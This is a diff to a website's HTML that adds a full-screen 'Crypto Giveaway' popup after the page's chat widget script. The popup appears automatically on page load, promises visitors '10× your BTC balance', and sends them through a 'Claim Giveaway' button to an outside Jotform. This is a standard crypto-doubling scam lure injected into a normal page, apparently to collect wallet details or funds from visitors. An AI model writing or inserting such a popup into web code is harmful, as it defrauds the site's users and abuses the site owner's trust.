@@ -363,6 +363,106 @@ s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
 })();
 </script>
-<!--End of Tawk.to Script-->	    
+<!--End of Tawk.to Script-->
+
+<!-- Giveaway Popup Overlay -->
+<style>
+  #giveawayOverlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: rgba(10, 10, 10, 0.95);
+    z-index: 9999;
+    color: #fff;
+    font-family: 'Segoe UI', sans-serif;
+    animation: fadeIn 0.4s ease-in-out;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0 }
+    to { opacity: 1 }
+  }
+
+  #giveawayContent {
+    position: relative;
+    max-width: 400px;
+    margin: 10% auto;
+    padding: 30px;
+    background: #1a1a1a;
+    border-radius: 12px;
+    text-align: center;
+    box-shadow: 0 0 20px #00ffe0;
+    border: 1px solid #00ffe0;
+  }
+
+  #giveawayContent h2 {
+    font-size: 1.5em;
+    margin-bottom: 10px;
+    color: #00ffe0;
+  }
+
+  #giveawayContent p {
+    font-size: 1em;
+    margin-bottom: 20px;
+  }
+
+  #claimBtn {
+    padding: 12px 20px;
+    background: linear-gradient(135deg, #00ffe0, #0088ff);
+    color: #000;
+    font-weight: bold;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+
+  #claimBtn:hover {
+    background: linear-gradient(135deg, #00ccaa, #0066cc);
+  }
+
+  .closeIcon {
+    position: absolute;
+    top: 12px;
+    right: 15px;
+    font-size: 22px;
+    color: #aaa;
+    cursor: pointer;
+    transition: color 0.3s;
+  }
+
+  .closeIcon:hover {
+    color: #fff;
+  }
+
+  .hoverX {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: 40px;
+    color: #333;
+    opacity: 0.05;
+    pointer-events: none;
+  }
+</style>
+
+<div id="giveawayOverlay">
+  <div class="hoverX">×</div>
+  <div id="giveawayContent">
+    <div class="closeIcon" onclick="document.getElementById('giveawayOverlay').style.display='none'">×</div>
+    <h2>Crypto Giveaway!</h2>
+    <p>Get up to 10× your BTC balance. Limited to first 1,000 users.</p>
+    <button id="claimBtn" onclick="window.open('https://form.jotform.com/251058216953559', '_blank')">Claim Giveaway</button>
+  </div>
+</div>
+
+<script>
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      document.getElementById('giveawayOverlay').style.display = 'block';
+    }, 1500); // delay in ms
+  });
+</script>   
 </body>
 </html>
